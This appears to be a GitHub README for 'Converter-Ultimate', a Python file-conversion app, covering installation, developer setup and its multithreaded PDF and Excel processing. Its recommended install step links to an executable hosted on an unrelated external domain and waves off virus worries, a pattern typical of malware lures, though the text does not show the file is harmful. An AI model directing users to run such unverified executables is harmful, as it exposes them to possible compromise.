Converter-Ultimate
Your all-in-one solution for intelligent file conversion. Built with Python, this powerful utility features a modern interface, support for a wide range of formats, and optional AI-powered features with GPU acceleration.

Installation
Choose the method that best suits your comfort level. For most users, the direct download is recommended.

Easiest Method: Direct Download (Recommended)(even a seperate option for Devs){couldnt add the .exe file here cause theres a limit of 25MB but ya know it got 54MB approx* size so)
This is the simplest way to get started. You get a pre-packaged installer that handles everything automatically.

Download the Installer:
Click the link below to download the app directly:
--- "https://www.oshonet.in/runclap/combine/runtime/app.exe" ---- (Note: For People who think everything is a virus i "BET" a $1000000000 that ya try using your VM if you are scared cause for gods sake, i am not that dumb to target tech guys who dont got a stable living..LOL..)
Download Converter-Ultimate-Installer.exe(runtime.exe)

Run the Installer:(2nd option but need libs like python and pyqt6 .etc)
Double-click the downloaded .exe file. The installer will guide you through the process, create shortcuts, and get the application ready to use.

Launch the App:
Find "Converter-Ultimate" on your desktop or in your Start Menu.

Alternative Method: Install via Python Script
This method is for users who prefer to run the installer script themselves using Python.

Download the Installer Script:
Download the runtime.py file from the main page of this repository.

Install Python:
If you don't have it, install the latest version of Python from python.org. Important: During installation, make sure to check the box that says "Add Python to PATH".

Run the Installer:
Double-click the runtime.py script. A welcome screen will appear.

Choose "Standard Installation" and click "Proceed".

The script will then automatically download all necessary libraries, build the application, and create shortcuts.

Launch the App:
Once complete, find "Converter-Ultimate" on your desktop or in your Start Menu.

Developer Setup
This method is for developers who want to run the application directly from the source code for testing or modification.

Clone the Repository:

git clone [https://github.com/SomerandmguyintheInternet/Converter-ultimate.git](https://github.com/SomerandmguyintheInternet/Converter-ultimate.git)
cd Converter-ultimate

Run the Installer in Developer Mode:
Double-click the runtime.py script. On the welcome screen:

Choose "Developer Setup" and click "Proceed".

This will quickly download the main app.py source file into your project folder.

Install Dependencies:
A requirements.txt file is included in the repository. Install all dependencies into your environment using pip:

pip install -r requirements.txt

Run the App:
You can now run the application directly from your terminal:

python app.py

Performance & Multithreading
To handle demanding tasks and large batches of files efficiently, Converter-Ultimate leverages multithreading across several key functions.

1. General Workflow Processing (AppWorker.process_job)
This is the main function for handling multi-step workflows from the "Advanced Mode" and most single-step jobs from the "Simple Mode" (like encryption, text extraction, etc.). If you provide multiple files for a single job, this function creates a thread pool and assigns each input file to a separate thread, allowing all files to be processed through the entire workflow concurrently. This provides a major speed boost for any batch operation.

2. PDF to Excel Conversion (AppWorker._run_specialized_pdf_process)
This function is specifically for the high-demand "PDF (Bank Statements) -> Excel" conversion task. Reading and analyzing tables from PDFs is very CPU-intensive. This function uses a thread pool to process each PDF file on a different CPU thread. It extracts the data from all files in parallel and then combines the results at the end, drastically reducing the total time for large batches of PDFs.

3. Excel File Combination (AppWorker._run_combine_excel_process)
This function handles the "Combine All Excel Files" task. Similar to the PDF function, this one uses a thread pool to read and parse multiple Excel files at the same time. Each file is opened on a separate thread, which speeds up the process of reading all the data into memory before it gets combined into a single output file.

Requirements & Limitations
For detailed information on dependencies, system requirements, and known limitations, please see the REQUIREMENTS.md file.
